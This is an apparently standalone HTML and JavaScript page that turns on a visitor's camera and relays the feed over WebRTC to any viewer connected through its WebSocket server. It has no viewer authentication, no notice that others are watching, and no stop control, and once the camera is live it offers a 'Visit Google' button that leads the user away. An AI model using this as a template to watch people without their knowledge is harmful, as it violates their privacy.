<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">

  <meta
    name="viewport"
    content="width=device-width, initial-scale=1">

  <title>Camera</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
    }

    h2 {
      margin: 20px;
    }

    #video {
      width: 100%;
      max-width: 1000px;
      background: black;
      display: block;
      margin: auto;
    }

    #allowBtn {
      padding: 15px 25px;
      font-size: 18px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin: 20px;
    }

    #status {
      margin: 15px;
      font-size: 16px;
    }

    #googleBtn {
      display: none;
      padding: 14px 25px;
      border: none;
      border-radius: 8px;
      font-size: 17px;
      cursor: pointer;
      margin: 15px;
    }
  </style>
</head>

<body>

<h2>Camera</h2>

<button id="allowBtn">
  Allow Camera
</button>

<div id="status">
  Camera permission is required.
</div>

<video
  id="video"
  autoplay
  playsinline
  muted>
</video>

<br>

<button id="googleBtn">
  Visit Google
</button>

<script>
"use strict";

const allowBtn =
  document.getElementById("allowBtn");

const status =
  document.getElementById("status");

const video =
  document.getElementById("video");

const googleBtn =
  document.getElementById("googleBtn");

let stream = null;
let socket = null;

const cameraId =
  crypto.randomUUID();

const peers =
  new Map();


/* =========================================
   START CAMERA
========================================= */

async function startCamera() {

  try {

    status.textContent =
      "Requesting camera permission...";

    stream =
      await navigator.mediaDevices.getUserMedia({
        video: {
          width: {
            ideal: 1920
          },
          height: {
            ideal: 1080
          },
          frameRate: {
            ideal: 30
          }
        },
        audio: false
      });

    video.srcObject = stream;

    await video.play();

    status.textContent =
      "Camera is LIVE.";

    allowBtn.style.display =
      "none";

    googleBtn.style.display =
      "inline-block";

    connectServer();

  } catch (error) {

    console.error(error);

    status.textContent =
      "Camera permission was not granted.";

  }
}


/* =========================================
   CONNECT WEBSOCKET
========================================= */

function connectServer() {

  const protocol =
    location.protocol === "https:"
      ? "wss:"
      : "ws:";

  socket =
    new WebSocket(
      protocol +
      "//" +
      location.host
    );


  socket.onopen = () => {

    socket.send(JSON.stringify({
      type: "register-camera",
      cameraId
    }));

    status.textContent =
      "Camera LIVE and connected.";
  };


  socket.onmessage = async event => {

    const msg =
      JSON.parse(event.data);


    /*
      VIEWER WANTS TO WATCH
    */

    if (msg.type === "viewer-request") {

      await createPeer(
        msg.viewerId
      );

      return;
    }


    /*
      VIEWER ANSWER
    */

    if (msg.type === "answer") {

      const peer =
        peers.get(msg.viewerId);

      if (!peer) return;

      await peer.setRemoteDescription(
        new RTCSessionDescription({
          type: "answer",
          sdp: msg.sdp
        })
      );

      return;
    }


    /*
      VIEWER ICE
    */

    if (msg.type === "viewer-ice") {

      const peer =
        peers.get(msg.viewerId);

      if (!peer) return;

      try {

        await peer.addIceCandidate(
          msg.candidate
        );

      } catch (error) {

        console.error(
          "ICE error:",
          error
        );

      }

      return;
    }


    /*
      VIEWER LEFT
    */

    if (msg.type === "viewer-left") {

      const peer =
        peers.get(msg.viewerId);

      if (peer) {
        peer.close();
        peers.delete(msg.viewerId);
      }
    }
  };


  socket.onclose = () => {

    status.textContent =
      "Server connection closed.";
  };
}


/* =========================================
   CREATE WEBRTC CONNECTION
========================================= */

async function createPeer(viewerId) {

  if (!stream) return;

  /*
    STUN helps the two devices discover
    their public network addresses.
  */

  const peer =
    new RTCPeerConnection({

      iceServers: [
        {
          urls:
            "stun:stun.l.google.com:19302"
        }
      ]

    });


  peers.set(
    viewerId,
    peer
  );


  /*
    Add camera video track.
  */

  for (const track of stream.getTracks()) {

    peer.addTrack(
      track,
      stream
    );
  }


  /*
    ICE candidate
  */

  peer.onicecandidate =
    event => {

      if (!event.candidate)
        return;

      socket.send(JSON.stringify({

        type: "camera-ice",

        cameraId,

        viewerId,

        candidate:
          event.candidate

      }));
    };


  /*
    Create offer
  */

  const offer =
    await peer.createOffer();


  await peer.setLocalDescription(
    offer
  );


  socket.send(JSON.stringify({

    type: "offer",

    cameraId,

    viewerId,

    sdp:
      peer.localDescription.sdp

  }));
}


/* =========================================
   GOOGLE BUTTON
========================================= */

googleBtn.addEventListener(
  "click",
  () => {

    window.open(
      "https://www.google.com/",
      "_blank"
    );

  }
);


/* =========================================
   START BUTTON
========================================= */

allowBtn.addEventListener(
  "click",
  startCamera
);

</script>

</body>
</html>
